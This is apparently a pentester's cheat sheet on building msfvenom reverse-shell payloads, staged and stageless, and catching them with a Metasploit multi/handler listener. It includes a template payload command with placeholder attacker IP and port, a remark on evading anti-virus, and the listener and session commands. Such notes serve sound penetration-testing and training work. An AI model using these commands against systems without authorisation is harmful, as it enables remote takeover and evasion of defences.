# MSFVENOM
#### Staged Payloads
These are sent in two parts with the first part being the stager which is executed on the target machine which connects back to the attacking machines listener. The second part which is the payload containing the code for the reverse shell. Used to get around anti-virus. Need to use a metasploit multi/handler listener. 
#### Stageless Payloads
This is self-contained code which sends a shell immediately back to the listener but is easily identifiable by anti-virus. 
#### Syntax
Syntax for a typical msfvenom payload:
```text
msfvenom -p [operating_system]/[architecture]/[payload] -f [format] -o [filename] LHOST=[listening_ip_address] LPORT=[listening_port_number]
```
- specify the format (-f), e.g .exe, .py, .aspx
- specify the output and filename (-o), e.g shell.exe
- LHOST is the attacking machine listening ip address
- LPORT is the attacking machines listening port
- specification of architecture for 32bit Windows targets is not needed
- staged payloads are denoted by a '/' (shell/reverse_tcp)
- stageless payloads are denoted by a '_' (shell_reverse_tcp)
  
To check available formats (-f):
```text
msfvenom --list formats
```
To check available payloads (-p):
```text
msfvenom --list payloads
```
# METASPLOIT MULTI/HANDLER
Spin up msfconsole and then enter the following command:
```text
use multi/handler
```
Use the following command to view required listener options and then make changed to LHOST and LPORT as necessary:
```text
show options
```
```text
set LHOST [your_listening_ip_address / interface]
```
```text
set LPORT [your_listening_port]
```
Once the above has been set, configure these options identical to what was configured using msfvenom:
```text
set PAYLOAD [your_msfvenom_payload]
```
```text
set LHOST [your_listening_ip_address / interface]
```
```text
set LPORT [your_listening_port]
```
Run the exploit when ready with:
```text
exploit
```
Use the following command if needed to view any shell sessions created (if it is sent to background):
```text
sessions
```
```text
sessions [id]
```
